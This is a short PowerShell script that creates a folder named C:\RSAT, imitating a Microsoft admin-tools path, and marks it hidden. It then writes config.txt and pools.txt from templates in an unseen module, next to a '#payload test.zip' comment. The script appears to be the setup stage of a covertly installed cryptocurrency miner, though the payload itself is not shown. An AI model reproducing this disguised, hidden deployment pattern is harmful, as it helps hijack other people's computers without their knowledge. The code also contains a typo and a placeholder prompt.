Import-Module "${psscriptroot}\APFunctions.psm1"

$opsDirectory = "C:\RSAT"

if (!(Test-Path $opsDirectory))
{
    mkdir $opsDirectory
	$f = Get-Item $opsDirectory -Force
	$f.Attributes = "Hidden"
}

#payload test.zip
stripExcess (configTpl) | Out-File config.txt
stripExcess (poolTpl) | Out-File pools.txt
alterConfigTpl config.txt
alterPoolTpl pools.txt
read-host -promt "yo"
